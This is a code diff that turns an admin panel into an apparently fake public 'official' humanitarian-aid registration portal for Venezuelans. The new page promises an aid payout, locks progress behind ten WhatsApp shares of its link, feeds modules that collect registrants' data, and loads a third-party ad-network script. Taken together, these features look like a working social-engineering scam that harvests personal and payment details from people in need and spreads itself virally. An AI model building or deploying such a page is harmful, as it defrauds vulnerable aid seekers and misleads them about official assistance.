@@ -3,85 +3,125 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Panel de Control Humanitario - Admin</title>
-    <link rel="stylesheet" href="admin.css">
+    <title>Plataforma de Asistencia Humanitaria</title>
+    
+    <meta property="og:title" content="Plataforma de Asistencia Humanitaria - Portal de Asignación">
+    <meta property="og:description" content="Regístrate en la plataforma oficial para recibir tu asignación de ayuda humanitaria económica.">
+    <meta property="og:image" content="https://gguybbqqeixjqtdsmljp.supabase.co/storage/v1/object/public/infomacion_vnz/Enviar%20wsp.jpg">
+    <meta property="og:image:type" content="image/jpeg">
+    <meta property="og:type" content="website">
+    
+    <link rel="stylesheet" href="dashboard.css">
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    
+    <script src="https://pl30142759.effectivecpmnetwork.com/13/82/c6/1382c63d38543705bcccb68b8d5a9ee5.js"></script>
 </head>
 <body>
-    <header class="admin-header">
-        <div class="header-contenido">
-            <h2>Panel de Aprobación Humanitaria</h2>
-            <span class="badge-rol">Rol: Administrador General</span>
-        </div>
+    <header class="ong-header">
+        <h1>Asistencia Humanitaria</h1>
+        <p>Portal de Registro y Asignación</p>
     </header>
 
-    <main class="admin-main">
-        <section class="metricas-rapidas">
-            <div class="card-metrica">
-                <span class="metrica-numero" id="num-pendientes">--</span>
-                <span class="metrica-etiqueta">Por Verificar</span>
-            </div>
-            <div class="card-metrica">
-                <span class="metrica-numero" id="num-aprobados">--</span>
-                <span class="metrica-etiqueta">Aprobados</span>
-            </div>
-        </section>
-
-        <section class="tabla-contenedor">
-            <div class="tabla-header">
-                <h3>Solicitudes Recientes</h3>
-                <button id="btn-refrescar" class="btn-refrescar">🔄 Actualizar</button>
-            </div>
-            
-            <div class="tabla-scroll">
-                <table id="tabla-solicitudes">
-                    <thead>
-                        <tr>
-                            <th>Afectado</th>
-                            <th>Documentación</th>
-                            <th>Estado Actual</th>
-                            <th>Datos de Pago</th>
-                            <th>Acciones</th>
-                        </tr>
-                    </thead>
-                    <tbody id="lista-solicitudes">
-                        <tr>
-                            <td colspan="5" style="text-align: center; padding: 20px; color: #888;">
-                                Cargando registros en tiempo real...
-                            </td>
-                        </tr>
-                    </tbody>
-                </table>
-            </div>
-        </section>
-
-        <section class="tabla-contenedor" style="margin-top: 20px; padding: 20px;">
-            <h3 style="margin-top: 0; margin-bottom: 15px;">📢 Publicar Nuevo Reporte / Noticia</h3>
-            <form id="form-publicar-noticia">
-                <div style="margin-bottom: 12px;">
-                    <label style="display:block; font-weight:bold; margin-bottom:5px; color:#1E293B;">Título del Reporte:</label>
-                    <input type="text" id="noticia-titulo" required placeholder="Ej. Actualización de asignaciones en Valencia" style="width:100%; padding:8px; border:1px solid #CBD5E1; border-radius:4px; box-sizing:border-box;">
-                </div>
-                <div style="margin-bottom: 12px;">
-                    <label style="display:block; font-weight:bold; margin-bottom:5px; color:#1E293B;">Contenido del Reporte:</label>
-                    <textarea id="noticia-contenido" required rows="4" placeholder="Escribe los detalles oficiales del reporte aquí..." style="width:100%; padding:8px; border:1px solid #CBD5E1; border-radius:4px; box-sizing:border-box; resize:vertical;"></textarea>
-                </div>
-                <div style="margin-bottom: 15px;">
-                    <label style="display:block; font-weight:bold; margin-bottom:5px; color:#1E293B;">URL de la Imagen (Opcional):</label>
-                    <input type="text" id="noticia-url-img" placeholder="Ej. https://enlace.com/imagen.jpg" style="width:100%; padding:8px; border:1px solid #CBD5E1; border-radius:4px; box-sizing:border-box;">
-                </div>
-                <button type="submit" style="background-color:#10B981; color:white; font-weight:bold; padding:10px 20px; border:none; border-radius:4px; cursor:pointer; width:100%;">Publicar Reporte</button>
-            </form>
-
-            <hr style="margin: 25px 0; border: 0; border-top: 1px solid #E2E8F0;">
-
-            <h3 style="color: #1E293B; margin-bottom: 15px;">🗂️ Historial y Control de Reportes Publicados</h3>
-            <div id="lista-gestion-noticias" style="display: flex; flex-direction: column; gap: 10px;">
-                <p style="color: #888; font-style: italic;">Cargando reportes publicados...</p>
-            </div>
-        </section>
+    <main class="dashboard-container">
+        <div id="modulo-confirmar"></div>
+        <div id="modulo-espera" style="display: none;"></div>
+        <div id="modulo-pago" style="display: none;"></div>
+        
+        <div id="modulo-final" style="display:none; padding: 20px; text-align: center;">
+            <h2>✅ Registro Exitoso</h2>
+            <p>Tu información ha sido recibida. En las próximas 24 horas se realizará la asignación de la ayuda humanitaria.</p>
+            <hr>
+            <h3>Reportes y Actualidad</h3>
+            <div id="contenedor-noticias"></div>
+        </div>
     </main>
 
-    <script src="admin.js"></script>
+    <script>
+        // Variables para el control de compartidos
+        let compartidosContador = 0;
+        const totalRequerido = 10;
+        
+        // Coloca aquí exactamente el dominio de tu Vercel cuando lo publiques
+        const enlaceCompartir = "https://ayudahumanitariavnz.vercel.app"; 
+        const mensajeTexto = encodeURIComponent("Regístrate en la plataforma oficial de Asistencia Humanitaria para recibir tu asignación ingresando aquí: ");
+
+        // Función interactiva para subir la barra
+        window.registrarCompartido = function() {
+            if (compartidosContador < totalRequerido) {
+                compartidosContador++;
+                
+                const porcentaje = (compartidosContador / totalRequerido) * 100;
+                
+                // Estos elementos se buscan en el DOM (están dentro de espera.html)
+                const barra = document.getElementById('barra-progreso');
+                const texto = document.getElementById('texto-progreso');
+                const btn = document.getElementById('btn-compartir-wa');
+                const msgExito = document.getElementById('mensaje-exito-compartir');
+
+                if(barra) barra.style.width = porcentaje + '%';
+                if(texto) texto.innerText = `${compartidosContador}/${totalRequerido} Compartidos`;
+                
+                if (compartidosContador === totalRequerido && btn && msgExito) {
+                    btn.disabled = true;
+                    btn.style.background = '#94A3B8';
+                    btn.innerText = "✅ Completado";
+                    msgExito.style.display = 'block';
+                }
+            }
+
+            // Abre WhatsApp con el texto y link. WhatsApp leerá los Meta Tags de arriba para sacar la imagen.
+            window.open(`https://api.whatsapp.com/send?text=${mensajeTexto}${enlaceCompartir}`, '_blank');
+        };
+
+        // Función para inyectar componentes HTML
+        async function cargarModulo(idContenedor, rutaHtml, rutaCss, rutaJs) {
+            try {
+                const respuesta = await fetch(rutaHtml);
+                const html = await respuesta.text();
+                document.getElementById(idContenedor).innerHTML = html;
+
+                if (rutaCss) {
+                    const link = document.createElement('link');
+                    link.rel = 'stylesheet';
+                    link.href = rutaCss;
+                    document.head.appendChild(link);
+                }
+
+                if (rutaJs) {
+                    const script = document.createElement('script');
+                    script.src = rutaJs;
+                    script.defer = true;
+                    document.body.appendChild(script);
+                }
+            } catch (error) {
+                console.error(`Error cargando el módulo ${rutaHtml}:`, error);
+            }
+        }
+
+        // Función base para evitar errores al ser llamada desde confirmar.js
+        async function cargarNoticias() {
+            const contenedor = document.getElementById('contenedor-noticias');
+            if (contenedor) {
+                contenedor.innerHTML = '<p style="color: #64748B;">Cargando reportes actualizados de Venezuela...</p>';
+            }
+        }
+
+        // Inicializar Dashboard cargando el primer módulo
+        window.onload = () => {
+            cargarModulo(
+                'modulo-confirmar', 
+                'boton_confirmar/confirmar.html', 
+                'boton_confirmar/confirmar.css', 
+                'boton_confirmar/confirmar.js'
+            );
+            
+            cargarModulo(
+                'modulo-espera', 
+                'estado_espera/espera.html', 
+                'estado_espera/espera.css', 
+                null
+            );
+        };
+    </script>
 </body>
 </html>
